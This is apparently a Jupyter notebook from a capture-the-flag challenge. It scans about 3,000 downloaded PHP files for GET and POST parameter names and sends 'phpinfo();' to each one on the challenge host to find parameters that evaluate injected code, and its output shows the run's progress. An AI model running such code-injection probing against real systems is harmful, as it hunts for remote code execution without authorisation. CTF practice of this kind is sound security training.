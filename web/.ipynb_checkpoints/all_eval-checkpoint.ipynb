{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests as req\n",
    "import os,re\n",
    "files = \"E:/download/www/src/\"\n",
    "file_li = [file_name for file_name in os.listdir('E:/download/www/src')]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1/3002 0.03%\n",
      "2/3002 0.07%\n",
      "3/3002 0.1%\n",
      "4/3002 0.13%\n",
      "5/3002 0.17%\n",
      "6/3002 0.2%\n",
      "7/3002 0.23%\n",
      "8/3002 0.27%\n",
      "9/3002 0.3%\n",
      "10/3002 0.33%\n",
      "11/3002 0.37%\n",
      "12/3002 0.4%\n",
      "13/3002 0.43%\n",
      "14/3002 0.47%\n",
      "15/3002 0.5%\n",
      "16/3002 0.53%\n",
      "17/3002 0.57%\n",
      "18/3002 0.6%\n",
      "19/3002 0.63%\n",
      "20/3002 0.67%\n",
      "21/3002 0.7%\n",
      "22/3002 0.73%\n",
      "23/3002 0.77%\n",
      "24/3002 0.8%\n",
      "25/3002 0.83%\n",
      "26/3002 0.87%\n",
      "27/3002 0.9%\n",
      "28/3002 0.93%\n",
      "29/3002 0.97%\n",
      "30/3002 1.0%\n",
      "31/3002 1.03%\n",
      "32/3002 1.07%\n",
      "33/3002 1.1%\n"
     ]
    }
   ],
   "source": [
    "url = \"http://b5067e42-85aa-4bad-a01f-85427b37e758.node4.buuoj.cn:81/\"\n",
    "cnts = 0\n",
    "for fp in file_li:\n",
    "    with open(\"E:/download/www/res.txt\",'a') as wf:\n",
    "        with open(files+fp,'r') as f:\n",
    "            contents = f.read()\n",
    "            url += fp\n",
    "            get_li = re.findall(\"GET\\[['|\\\"](.*)?['|\\\"]\\]\",contents)\n",
    "            get_li = set(get_li)\n",
    "            post_li = re.findall(\"POST\\[['|\\\"](.*)?['|\\\"]\\]\",contents)\n",
    "            post_li = set(post_li)\n",
    "            for get_args in get_li:\n",
    "                data_get = {get_args:\"phpinfo();\"}\n",
    "                resp = req.get(url,data_get)\n",
    "                print(url,'GET',resp.status_code,get_args,1 if resp.text.find('PHP Version')>=0 else 0,file=wf) \n",
    "            for post_args in post_li:\n",
    "                data_post = {post_args:\"phpinfo();\"}\n",
    "                resp = req.post(url,data_post)\n",
    "                print(url,'POST',resp.status_code,post_args,1 if resp.text.find('PHP Version')>=0 else 0,file=wf)\n",
    "            cnts += 1\n",
    "            print(str(cnts)+\"/\"+str(len(file_li)),str(round(cnts/len(file_li)*100,2))+\"%\")\n",
    "        url = \"http://b5067e42-85aa-4bad-a01f-85427b37e758.node4.buuoj.cn:81/\""
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
